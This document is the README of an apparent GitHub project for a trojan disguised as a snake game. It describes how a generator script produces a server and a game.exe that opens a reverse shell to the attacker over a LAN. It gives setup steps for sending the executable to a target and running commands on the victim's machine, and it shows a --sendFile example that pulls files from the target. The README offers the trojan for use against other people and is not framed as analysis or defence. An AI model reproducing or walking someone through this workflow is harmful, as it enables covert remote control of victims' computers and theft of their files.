# Trojan
It is a trojan that will give full access to the command line of the target machine wile being disguised as a snake game.

But, it only works on LAN

A new and improved version is under development, and can be found [here](https://github.com/ishaan-kapoor/Trojan)

When `main.py` is executed using `python main.py` it creates 2 other files: `server.py` and `game.exe`.

`game.exe` is the classic snake game on the outside and a malware on the inside.

Once run, `game.exe` connects to the computer (on the same local network) which has `server.py` running and waits for commands.

Commands sent from `server.py` are executed in the computer which has the trojan and the output is sent to `server.py`.

If `game.exe` is sent to multiple targets then you can control them similtaneously with a single instance of `server.py`.

### Setup and Execution
* Run `main.py` after connecting to the local area network your target is/will be connected to.
* Execute `server.py` on your system (which has to be in same LAN as target system).
* Send the `game.exe` file to the target and wait for him/her to execute the file once.
* Set target’s name in your server by answering the prompt that follows their connection.
* Run commands that you wish to run in the command prompt of the target. (i.e. you have reverse shell)
* Multiple commands can be sent at once by separating them with semicolon (`;`)
* Use `--sendFile` flag to transfer files from target’s machine to your computer.
  * e.g. `target_name > --sendFile path_1, path_2; dir ..\; mkdir new_dir` will execute `dir ..\` and `mkdir new_dir` in the target’s command line and will send the files `path_1` and `path_2` from the target’s system to the server’s downloads folder.


Please refer to `Report.docx` for a detailed explaination.
